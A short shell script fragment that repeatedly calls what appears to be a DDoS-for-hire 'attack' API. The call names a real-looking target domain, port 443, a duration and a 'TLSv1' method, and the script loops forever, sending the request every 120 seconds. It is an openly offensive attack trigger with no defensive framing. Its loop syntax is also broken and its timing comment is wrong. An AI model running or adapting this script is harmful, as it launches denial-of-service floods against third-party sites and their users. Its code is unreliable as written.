url="http://192.46.228.181:6677/api/attack?user=private1233&secrer=privatekey&host=https://cerdig.com&port=443&time=120&method=TLSv1"

send_request() { 
    curl -s "$url"
}

#infinite loop to send req
while true, do
   send_request
   sleep 120 # 10 = 60 second
